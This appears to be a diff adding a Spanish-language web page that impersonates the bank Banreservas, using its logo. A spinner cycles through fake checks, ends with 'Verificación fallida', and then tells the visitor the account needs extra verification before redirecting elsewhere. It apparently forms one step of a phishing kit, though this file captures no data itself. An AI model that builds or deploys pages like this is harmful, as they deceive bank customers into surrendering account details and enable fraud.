@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Validación de datos</title>
+    <style>
+        body {
+            font-family: 'Open Sans', sans-serif;
+            background-color: #f0f4f8;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+
+        .logo {
+            margin-bottom: 30px;
+        }
+
+        .logo img {
+            width: 200px;
+        }
+
+        .spinner {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #0072c6;
+            border-radius: 50%;
+            width: 80px;
+            height: 80px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg);}
+            100% { transform: rotate(360deg);}
+        }
+
+        .message {
+            text-align: center;
+            font-size: 18px;
+            color: #333;
+            max-width: 300px;
+            min-height: 50px;
+        }
+    </style>
+<style type="text/css">
+.grande { font-size: 60px; }
+</style>
+<script>
+// Escribir aqui el código Javascript
+</script>
+</head>
+<body>
+
+    <div class="logo">
+        <img src="https://cdnebrpeastus.azureedge.net/banreservas/media/xxpfq31w/banreservas-logo.png" alt="Banreservas Logo">
+    </div>
+
+    <div class="spinner"></div>
+
+    <div class="message" id="message">Necesitamos comprobación extra para validar tu cuenta.</div>
+
+    <script>
+        const messages = [
+            "Revisando datos...",
+            "Validando información...",
+            "Comprobando historial...",
+            "Procesando...",
+            "Verificación fallida...",
+        ];
+
+        const finalMessage = "Necesitamos comprobación extra para validar tu cuenta.";
+
+        const messageEl = document.getElementById("message");
+        let index = 0;
+
+        // Cambia mensajes cada 2 segundos
+        const interval = setInterval(() => {
+            if(index < messages.length) {
+                messageEl.textContent = messages[index];
+                index++;
+            }
+        }, 2000);
+
+        // Después de 12 segundos (mensajes + buffer), mostrar mensaje final
+        setTimeout(() => {
+            clearInterval(interval);
+            messageEl.textContent = finalMessage;
+        }, 12000);
+
+        // Redirige 3 segundos después de mostrar el mensaje final
+        setTimeout(() => {
+            window.location.href = "google.com";
+        }, 15000);
+    </script>
+
+
+
+
+</body></html>
